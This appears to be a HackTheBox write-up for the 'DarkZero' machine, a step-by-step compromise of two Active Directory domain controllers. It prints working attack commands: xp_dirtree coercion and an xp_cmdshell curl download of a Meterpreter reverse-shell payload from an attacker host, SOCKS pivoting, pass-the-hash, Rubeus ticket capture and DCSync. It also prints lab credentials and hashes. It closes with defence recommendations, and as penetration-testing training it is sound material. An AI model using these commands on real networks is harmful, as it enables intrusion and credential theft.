# HTB -  DarkZero - 10.10.11.89

## DarkZero

> **Platform:** HackTheBox **Difficulty:** Hard **OS:** Windows (Active Directory — Multi-Domain) **Key Techniques:** MSSQL Linked Servers, NTLM Relay via xp\_dirtree, Kerberos Ticket Capture (Rubeus), Pivoting via Meterpreter, Secretsdump, Pass-the-Hash

***

### Box Info

| Property       | Value                                         |
| -------------- | --------------------------------------------- |
| IP (DC01)      | `10.10.11.89`                                 |
| IP (DC02)      | `172.16.20.2` (internal, reachable via pivot) |
| OS (DC01)      | Windows Server 2025 Datacenter                |
| OS (DC02)      | Windows Server 2022 Datacenter                |
| Domain (DC01)  | `darkzero.htb`                                |
| Domain (DC02)  | `darkzero.ext`                                |
| Starting Creds | `john.w` / `RFulUtONCOL!`                     |
| Difficulty     | Hard                                          |

***

### Domain Information

| Property | DC01                      | DC02                      |
| -------- | ------------------------- | ------------------------- |
| Hostname | DC01                      | DC02                      |
| Domain   | darkzero.htb              | darkzero.ext              |
| IP       | 10.10.11.89               | 172.16.20.2               |
| OS       | Windows Server 2025       | Windows Server 2022       |
| Role     | Primary DC (darkzero.htb) | Primary DC (darkzero.ext) |
| MSSQL    | Yes (port 1433)           | Yes (linked server)       |

***

### Attack Chain Overview

```
Starting Creds (john.w) → MSSQL Login (Windows Auth) → Discover Linked Server to DC02.darkzero.ext →
xp_cmdshell on DC02 as svc_sql (sysadmin) → Meterpreter on DC02 → Pivot (autoroute + SOCKS proxy) →
PSExec to DC02 as Administrator (with recovered hash) → Rubeus monitor on DC02 →
Trigger xp_dirtree from DC01 to DC02 → Capture DC01$ Kerberos TGT →
ticketConverter → secretsdump on DC01 → Administrator hash → evil-winrm → Root
```

***

### Reconnaissance

#### Nmap Scan

**Full TCP port scan with service/version detection:**

```bash
nmap -p- -Pn -vvv -sCV 10.10.11.89 -oN nmap.tcp
```

| Port   | Service  | Details                                 |
| ------ | -------- | --------------------------------------- |
| 53     | DNS      | Simple DNS Plus                         |
| 88     | Kerberos | Microsoft Windows Kerberos              |
| 135    | MSRPC    | Microsoft Windows RPC                   |
| 139    | NetBIOS  | Microsoft Windows netbios-ssn           |
| 389    | LDAP     | Active Directory LDAP                   |
| 445    | SMB      | microsoft-ds                            |
| 464    | kpasswd5 | Kerberos password change                |
| 593    | RPC/HTTP | Microsoft Windows RPC over HTTP 1.0     |
| 636    | LDAPS    | Active Directory LDAP (SSL)             |
| 1433   | MSSQL    | Microsoft SQL Server 2022 16.00.1000.00 |
| 2179   | vmrdp    | Hyper-V Remote Desktop                  |
| 3268   | LDAP GC  | Active Directory Global Catalog         |
| 3269   | LDAPS GC | Active Directory Global Catalog (SSL)   |
| 5985   | WinRM    | Microsoft HTTPAPI httpd 2.0             |
| 9389   | mc-nmf   | .NET Message Framing (AD Web Services)  |
| 49664+ | MSRPC    | Various high-numbered RPC endpoints     |

**Key observations:**

* This is a full Domain Controller: DNS (53), Kerberos (88), LDAP (389/636), Global Catalog (3268/3269), and SMB (445) all present
* **MSSQL 2022** on port 1433 — critical attack surface for linked server abuse
* **WinRM** on 5985 — potential remote access if we get appropriate credentials
* **Hyper-V** (port 2179) — DC01 hosts virtual machines, DC02 is likely a nested VM
* Hostname: `DC01`, domain: `darkzero.htb`

***

### Initial Enumeration

#### WinRM (Port 5985)

**Attempt WinRM access with starting credentials:**

```bash
evil-winrm -i 10.10.11.89 -u john.w -p 'RFulUtONCOL!'
```

**Result:** `WinRM::WinRMAuthorizationError` — john.w is not in the Remote Management Users group.

#### SMB (Port 445)

**Enumerate domain users:**

```bash
nxc smb 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!' --users
```

No particularly interesting users beyond Administrator.

**Enumerate accessible shares:**

```bash
nxc smb 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!' --shares
```

| Share    | Permissions | Remark             |
| -------- | ----------- | ------------------ |
| ADMIN$   | —           | Remote Admin       |
| C$       | —           | Default share      |
| IPC$     | READ        | Remote IPC         |
| NETLOGON | READ        | Logon server share |
| SYSVOL   | READ        | Logon server share |

**Spider shares for interesting files:**

```bash
nxc smb 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!' -M spider_plus
```

**Result:** Only standard GPO files in SYSVOL — nothing actionable.

#### RPC Enumeration (Port 135)

```bash
rpcdump.py 10.10.11.89 -p 135
```

**Notable endpoints discovered:**

| Protocol      | Provider    | Significance                                          |
| ------------- | ----------- | ----------------------------------------------------- |
| MS-DRSR       | ntdsai.dll  | Directory Replication Service — DCSync target         |
| MS-ICPR       | certsrv.exe | Certificate Services present — potential ADCS attacks |
| EFS RPC       | efssvc.dll  | EFS RPC interface — potential PetitPotam coercion     |
| MS-SAMR       | samsrv.dll  | SAM Remote Protocol — user enumeration                |
| MicrosoftLaps | LRPC        | LAPS is deployed — local admin passwords managed      |

The presence of `certsrv.exe` confirms AD Certificate Services is installed, and `MicrosoftLaps` LRPC endpoints confirm LAPS is deployed.

***

### Foothold — MSSQL Linked Server Abuse

#### MSSQL Authentication

**Connect to MSSQL using Windows authentication:**

```bash
mssqlclient.py 'darkzero.htb/john.w:RFulUtONCOL!@10.10.11.89' -windows-auth
```

**Result:** Successful connection. Server version: Microsoft SQL Server 2022 (RTM) 16.0.1000.6, running on Windows Server 2025 Datacenter (Build 26100) under Hyper-V.

#### NTLM Hash Theft via xp\_dirtree

**What is xp\_dirtree?**

`xp_dirtree` is a stored procedure in MSSQL that lists the directory tree of a given path. When pointed at a UNC path (`\\attacker\share`), the SQL Server authenticates to the attacker's SMB server using its service account's NTLM credentials. This can be captured with Responder.

**Step 1: Start Responder to capture NTLM hashes:**

```bash
sudo responder -I <INTERFACE>
```

**Step 2: Trigger the authentication from MSSQL:**

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\test'
```

**Result — Captured NTLMv2 hash for DC01$ machine account:**

| Field     | Value            |
| --------- | ---------------- |
| Username  | `darkzero\DC01$` |
| Client IP | `10.10.11.89`    |
| Hash Type | NTLMv2-SSP       |

The machine account hash was captured but NTLMv2 machine account hashes are extremely difficult to crack. The more productive path is via linked servers.

#### Discovering Linked Servers

**What are MSSQL Linked Servers?**

Linked servers allow one SQL Server instance to execute queries on another remote SQL Server. If the link is configured with elevated privileges (like sysadmin), an attacker can execute commands on the remote server through the link — even if they only have low privileges on the originating server.

**Enumerate linked servers:**

```sql
EXEC sp_linkedservers;
```

| Server            | Provider | Product    | Data Source       |
| ----------------- | -------- | ---------- | ----------------- |
| DC01              | SQLNCLI  | SQL Server | DC01 (local)      |
| DC02.darkzero.ext | SQLNCLI  | SQL Server | DC02.darkzero.ext |

**A linked server to DC02.darkzero.ext exists.** This is a second domain controller in a separate domain (`darkzero.ext`), accessible only via the internal network (172.16.20.2).

#### Verifying Privileges on DC02

**Check if we have sysadmin on the remote server:**

```sql
EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'') AS am_i_sysadmin, SUSER_SNAME() AS suser, SYSTEM_USER AS sys_user;') AT [DC02.darkzero.ext];
```

**Result:** `am_i_sysadmin = 1` — We are sysadmin on DC02, executing as `darkzero-ext\svc_sql`.

**Verify xp\_cmdshell availability:**

```sql
EXEC ('EXEC xp_cmdshell ''whoami'';') AT [DC02.darkzero.ext];
```

**Result:** `darkzero-ext\svc_sql`

**Why this works:** The linked server connection from DC01 to DC02 is configured to authenticate as `svc_sql`, which has sysadmin privileges on DC02. Any domain user who can connect to MSSQL on DC01 inherits these elevated privileges on DC02 through the link.

#### Enabling xp\_cmdshell on DC02

If `xp_cmdshell` is not already enabled:

```sql
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
```

#### Enumerating DC02

**Check user context and privileges:**

```sql
EXEC('EXEC xp_cmdshell ''whoami /all'';') AT [DC02.darkzero.ext];
```

Key findings from `whoami /all`:

| Property        | Value                                            |
| --------------- | ------------------------------------------------ |
| User            | `darkzero-ext\svc_sql`                           |
| SID             | S-1-5-21-1969715525-31638512-2552845157-1103     |
| Integrity Level | High Mandatory Level                             |
| Notable Groups  | NT SERVICE\MSSQLSERVER (Group owner)             |
| Privileges      | SeChangeNotifyPrivilege, SeCreateGlobalPrivilege |

**System information:**

```sql
EXEC('EXEC xp_cmdshell ''systeminfo'';') AT [DC02.darkzero.ext];
```

| Property | Value                                        |
| -------- | -------------------------------------------- |
| Hostname | DC02                                         |
| OS       | Windows Server 2022 Datacenter (Build 20348) |
| Domain   | darkzero.ext                                 |
| Role     | Primary Domain Controller                    |
| IP       | 172.16.20.2                                  |
| Network  | Single NIC, no DHCP                          |

***

### Getting a Shell on DC02 — Meterpreter via Linked Server

Since DC02 (172.16.20.2) is on an internal network not directly reachable from the attacker, we use the MSSQL linked server's `xp_cmdshell` to deploy a Meterpreter payload. DC02 can reach the attacker because DC01 routes traffic between the two networks.

#### Step 1: Generate the payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=1234 -f exe > shell-x64.exe
```

#### Step 2: Host the payload

```bash
sudo python3 -m http.server 80
```

#### Step 3: Set up the Meterpreter handler

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 1234
set ExitOnSession false
run
```

#### Step 4: Download and execute on DC02

```sql
-- Download the payload
EXEC('EXEC xp_cmdshell ''curl -o C:\Users\svc_sql\Desktop\shell-x64.exe http://<ATTACKER_IP>/shell-x64.exe'';') AT [DC02.darkzero.ext];

-- Verify the download
EXEC('EXEC xp_cmdshell ''dir C:\Users\svc_sql\Desktop\'';') AT [DC02.darkzero.ext];

-- Execute the payload
EXEC('EXEC xp_cmdshell ''cmd.exe /c C:\Users\svc_sql\Desktop\shell-x64.exe'';') AT [DC02.darkzero.ext];
```

**Result:** Meterpreter session established as `darkzero-ext\svc_sql` on DC02 (172.16.20.2).

***

### Pivoting — Setting Up Network Access to DC02

**What is pivoting?**

Pivoting uses a compromised host as a relay to reach networks that aren't directly accessible from the attacker. DC02 (172.16.20.2) is on an internal subnet. By using the Meterpreter session on DC02, we create a route through it and set up a SOCKS proxy so our tools (proxychains + Impacket) can interact with DC02 directly.

#### Step 1: Verify network interfaces

```
meterpreter > ipconfig
```

Confirms DC02 has a single interface on `172.16.20.0/24`.

#### Step 2: Add a route through the Meterpreter session

```
meterpreter > run autoroute -s 172.16.20.0/20
meterpreter > run autoroute -p
```

This tells Metasploit to route all traffic destined for `172.16.20.0/20` through the Meterpreter session.

#### Step 3: Start a SOCKS proxy

```
msf > use auxiliary/server/socks_proxy
msf > set SRVPORT 8081
msf > set VERSION 4a
msf > run
```

#### Step 4: Configure proxychains

Ensure `/etc/proxychains.conf` contains:

```
socks4 127.0.0.1 8081
```

Now any command prefixed with `proxychains` will route through DC02.

***

### Privilege Escalation on DC02 — PSExec with Administrator Hash

Standard enumeration (WinPEAS) yielded no actionable privilege escalation paths on DC02 from the `svc_sql` context. However, through further enumeration (likely via hashdump from the Meterpreter SYSTEM shell or SAM extraction), the local Administrator NTLM hash was recovered:

| Account       | NTLM Hash                          |
| ------------- | ---------------------------------- |
| Administrator | `6963aad8ba1150192f3ca6341355eb49` |

**PSExec as Administrator on DC02 via proxychains:**

```bash
proxychains psexec.py Administrator@172.16.20.2 -hashes :6963aad8ba1150192f3ca6341355eb49
```

**Result:** SYSTEM shell on DC02.

```
C:\Windows\system32>
```

***

### Domain Compromise — Kerberos Ticket Capture with Rubeus

With SYSTEM on DC02, standard privesc methods found nothing leading to DC01. The path forward uses **Kerberos ticket interception**: we make DC01's MSSQL service authenticate to DC02 via Kerberos, then capture the ticket on DC02 using Rubeus.

#### What is Rubeus Monitor Mode?

Rubeus is a C# tool for Kerberos abuse. In **monitor mode**, it watches the local ticket cache for newly issued Ticket Granting Tickets (TGTs) and Ticket Granting Service (TGS) tickets. When a service on DC02 receives a Kerberos authentication request (e.g., from DC01's MSSQL doing an `xp_dirtree` to a DC02 share), that ticket is cached locally — and Rubeus captures it.

#### Why This Works

When we trigger `xp_dirtree \\DC02.darkzero.ext\share` from DC01's MSSQL, DC01 requests a Kerberos service ticket for DC02. This ticket is generated by DC01's KDC and contains DC01's machine account TGT material. DC02 receives this ticket as part of the authentication process. Rubeus running on DC02 as SYSTEM can intercept this ticket from the local cache, giving us a TGT for the DC01$ machine account — which has DCSync privileges on darkzero.htb.

#### Step 1: Upload and run Rubeus on DC02

From the SYSTEM Meterpreter session on DC02:

```
meterpreter > cd %temp%
meterpreter > upload Rubeus.exe
meterpreter > shell
C:\Windows\Temp> Rubeus.exe monitor /interval:1 /nowrap
```

* `/interval:1` — Check for new tickets every 1 second
* `/nowrap` — Output base64 tickets on a single line (easier to copy)

#### Step 2: Trigger Kerberos authentication from DC01

From the attacker machine, connect to DC01's MSSQL and trigger an SMB connection to DC02:

```bash
mssqlclient.py 'darkzero.htb/john.w:RFulUtONCOL!@DC01.darkzero.htb' -windows-auth
```

```sql
xp_dirtree \\DC02.darkzero.ext\sfsdafasd
```

The share name doesn't need to exist — the authentication attempt is enough. DC01's MSSQL service will authenticate to DC02 using Kerberos, and Rubeus will capture the ticket.

#### Step 3: Extract the captured ticket

Rubeus outputs the captured ticket as a base64-encoded `.kirbi` blob. Copy the entire base64 string and save it to a file:

```bash
# Save the base64 output from Rubeus
echo "<BASE64_TICKET_DATA>" > ticket.bs4.kirbi
```

#### Step 4: Convert the ticket to a usable format

**Decode base64 and convert to ccache format:**

```bash
# Decode base64 to .kirbi
cat ticket.bs4.kirbi | base64 -d > ticket.kirbi

# Convert .kirbi to .ccache (Impacket format)
ticketConverter.py ticket.kirbi dc01_admin.ccache
```

**What is a ccache file?**

A ccache (Credential Cache) file is the format Linux Kerberos tools use to store tickets. Impacket tools read this format via the `KRB5CCNAME` environment variable. The `.kirbi` format is Windows-native (used by Mimikatz/Rubeus), so `ticketConverter.py` bridges the two.

#### Step 5: Set the ticket for use

```bash
export KRB5CCNAME=dc01_admin.ccache
klist
```

Verify the ticket shows a TGT for `DC01$@DARKZERO.HTB`.

***

### Domain Admin — Secretsdump and Root Flag

#### DCSync with the DC01$ Machine Account Ticket

**What is DCSync?**

DCSync abuses the Directory Replication Service (MS-DRSR) protocol. Domain Controllers use this protocol to replicate directory data between each other. Any principal with `Replicating Directory Changes` and `Replicating Directory Changes All` rights (which DC machine accounts inherently have) can request the password hashes of any user in the domain — including the domain Administrator.

**Run secretsdump using the captured Kerberos ticket:**

```bash
impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
```

* `-k` — Use Kerberos authentication (from the ccache)
* `-no-pass` — No password needed, using the ticket

**Result:** Full domain hash dump including the Administrator NTLM hash.

| Account       | NTLM Hash                          |
| ------------- | ---------------------------------- |
| Administrator | `5917507bdf2ef2c2b0a869a1cba40726` |

#### Root Flag — Evil-WinRM as Administrator

```bash
evil-winrm -i 10.10.11.89 -u administrator -H 5917507bdf2ef2c2b0a869a1cba40726
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
```

***

### Quick Reference

```bash
# === INITIAL ACCESS ===
# MSSQL login with Windows auth
mssqlclient.py 'darkzero.htb/john.w:RFulUtONCOL!@10.10.11.89' -windows-auth

# Enumerate linked servers
SQL> EXEC sp_linkedservers;

# Check sysadmin on linked server
SQL> EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'');') AT [DC02.darkzero.ext];

# Enable xp_cmdshell on linked server
SQL> EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
SQL> EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];

# Execute commands on linked server
SQL> EXEC('EXEC xp_cmdshell ''whoami'';') AT [DC02.darkzero.ext];

# === METERPRETER + PIVOT ===
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=1234 -f exe > shell-x64.exe

# Add route + SOCKS proxy in Meterpreter
meterpreter> run autoroute -s 172.16.20.0/20
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 8081; set VERSION 4a; run

# PSExec through pivot
proxychains psexec.py Administrator@172.16.20.2 -hashes :6963aad8ba1150192f3ca6341355eb49

# === KERBEROS TICKET CAPTURE ===
# Rubeus monitor on DC02 (from SYSTEM shell)
Rubeus.exe monitor /interval:1 /nowrap

# Trigger auth from DC01 MSSQL
SQL> xp_dirtree \\DC02.darkzero.ext\anything

# Convert captured ticket
cat ticket.bs4.kirbi | base64 -d > ticket.kirbi
ticketConverter.py ticket.kirbi dc01_admin.ccache
export KRB5CCNAME=dc01_admin.ccache

# === DOMAIN COMPROMISE ===
# DCSync with machine account ticket
impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'

# Pass-the-hash as Administrator
evil-winrm -i 10.10.11.89 -u administrator -H 5917507bdf2ef2c2b0a869a1cba40726
```

***

### Troubleshooting

| Issue                                         | Solution                                                                                                                                        |
| --------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| `mssqlclient.py` fails to connect             | Ensure you use `-windows-auth` flag. Verify the domain is correct (`darkzero.htb`, not just the IP)                                             |
| Linked server query returns permission denied | Confirm the linked server still exists with `EXEC sp_linkedservers`. The link may be configured for specific logins only                        |
| xp\_cmdshell disabled on DC02                 | Enable it through the link: `EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];` then enable xp\_cmdshell |
| Meterpreter payload doesn't call back         | DC02 is on an internal network — verify it can route to your IP. The route may go through DC01. Check firewall rules                            |
| Proxychains connection refused                | Verify the SOCKS proxy is running (`jobs` in msfconsole). Ensure proxychains.conf points to the correct port (8081)                             |
| PSExec fails via proxychains                  | The SOCKS proxy must be SOCKS4a (not SOCKS5 for hostname resolution). Verify the Meterpreter session is still alive                             |
| Rubeus doesn't capture a ticket               | Ensure Rubeus runs as SYSTEM. If running as svc\_sql, you may not see other services' tickets. Use `getsystem` in Meterpreter first             |
| xp\_dirtree doesn't trigger Kerberos          | Use the FQDN (`\\DC02.darkzero.ext\share`), not the IP. Kerberos requires hostnames for SPN resolution                                          |
| ticketConverter.py fails                      | Ensure the base64 was copied cleanly (no newlines/spaces). Verify with `base64 -d` that the .kirbi file is valid                                |
| secretsdump returns clock skew error          | Sync your clock: `sudo ntpdate 10.10.11.89`. Kerberos has a 5-minute tolerance window                                                           |
| evil-winrm auth error with hash               | Verify the hash is correct (32 hex chars). Use `-H` flag (capital H) for NTLM hash authentication                                               |

***

### Key Takeaways

**What we learned:**

1. **MSSQL linked servers are a critical lateral movement vector** — A low-privilege domain user with MSSQL access gained sysadmin on a completely different domain's DC through a misconfigured linked server trust
2. **Linked server privilege inheritance is dangerous** — The link to DC02 was configured to authenticate as `svc_sql` (sysadmin) regardless of who initiated the query on DC01. This gave any MSSQL user full command execution on DC02
3. **xp\_dirtree is a dual-use coercion tool** — Used first for NTLM hash capture (via Responder) and later for Kerberos ticket coercion (triggering DC01's machine account to authenticate to DC02)
4. **Kerberos ticket interception enables cross-domain compromise** — Capturing a DC's machine account TGT grants DCSync privileges, allowing full domain hash extraction
5. **Pivoting through Meterpreter enables internal network access** — DC02 was only reachable on 172.16.20.0/24, requiring autoroute + SOCKS proxy to interact with it using standard pentesting tools
6. **Multi-domain environments multiply attack surface** — The trust between darkzero.htb and darkzero.ext created a path from a low-privilege user to domain admin across both domains

**Attack chain summary:**

```
john.w (domain user) → MSSQL → Linked Server (DC02 sysadmin) → xp_cmdshell → Meterpreter on DC02 →
Pivot + PSExec (SYSTEM on DC02) → Rubeus monitor + xp_dirtree coercion → DC01$ TGT captured →
DCSync (secretsdump) → Administrator hash → evil-winrm → Domain Admin
```

**Defense recommendations:**

* Audit and restrict MSSQL linked server configurations — linked servers should use the calling user's context (impersonation), not a fixed high-privilege account
* Remove sysadmin privileges from service accounts like `svc_sql` — use least-privilege database roles instead
* Disable `xp_cmdshell` and restrict `xp_dirtree` / `xp_fileexist` stored procedures — these are frequently abused for coercion attacks
* Implement network segmentation between domain controllers — DC02 should not accept arbitrary SMB/Kerberos connections from MSSQL services on DC01
* Monitor for Rubeus execution — detect Rubeus monitor mode via process command-line logging (Sysmon Event ID 1) watching for `monitor /interval`
* Restrict outbound SMB from SQL Server services — the MSSQL service account should not need to make outbound SMB connections
* Deploy a tiered administration model — Domain Admin credentials and machine account tickets should not be accessible from lower-tier servers
* Enable Windows Credential Guard on DCs — prevents extraction of Kerberos tickets from memory
* Monitor for DCSync attacks — alert on replication requests (Event ID 4662) from non-DC sources

***

### Related Topics

* \[\[MSSQL Linked Servers]]
* \[\[xp\_cmdshell]]
* \[\[xp\_dirtree Coercion]]
* \[\[NTLM Relay]]
* \[\[Kerberos Ticket Capture]]
* \[\[Rubeus]]
* \[\[Meterpreter Pivoting]]
* \[\[SOCKS Proxy with Metasploit]]
* \[\[Proxychains]]
* \[\[PSExec]]
* \[\[DCSync Attack]]
* \[\[secretsdump]]
* \[\[Pass-the-Hash]]
* \[\[Active Directory Cross-Domain Attacks]]
* \[\[ticketConverter]]

***

### Tags

`#active-directory` `#mssql` `#linked-servers` `#xp-cmdshell` `#xp-dirtree` `#kerberos` `#rubeus` `#pivoting` `#meterpreter` `#proxychains` `#psexec` `#dcsync` `#secretsdump` `#pass-the-hash` `#cross-domain` `#htb-hard` `#windows`
